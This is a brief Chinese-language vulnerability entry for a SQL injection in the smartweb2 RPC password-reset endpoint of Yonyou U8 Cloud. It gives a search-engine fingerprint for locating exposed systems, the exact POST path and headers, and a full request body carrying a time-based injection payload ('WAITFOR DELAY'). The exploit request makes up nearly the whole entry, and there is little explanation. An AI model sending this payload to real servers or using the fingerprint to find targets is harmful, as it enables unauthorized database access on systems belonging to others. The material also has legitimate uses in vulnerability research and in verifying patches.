# 用友U8Cloudsmartweb2存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: JSESSIONID=C2CFFE1429FF812ABF357C2BDD5BDBC1.server; JSESSIONID=8FEF31DBA1E318870…`　`Content-Length: 672`

**请求体 / payload**
```
__type=updateData&__viewInstanceId=nc.bs.hrss.login.ResetPassword~nc.bs.hrss.login.ResetPasswordViewModel&__xml=<rpc transaction="10" method="resetPwd"><def><dataset type="Custom" id="dsResetPwd"><f name="user"></f><f name="ID"></f></dataset></def><data><rs dataset="dsResetPwd"><r id="10009" state="insert"><n><v>1';WAITFOR DELAY '0:0:6'--</v><v>11111111111111111111</v></n></r></rs></data><vps><p name="__profileKeys">findPwd%3B15b021628b8411d33569071324dc1b37</p></vps></rpc>&1700109885028
```

**其他**
- 用友U8 Cloud smartweb2存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud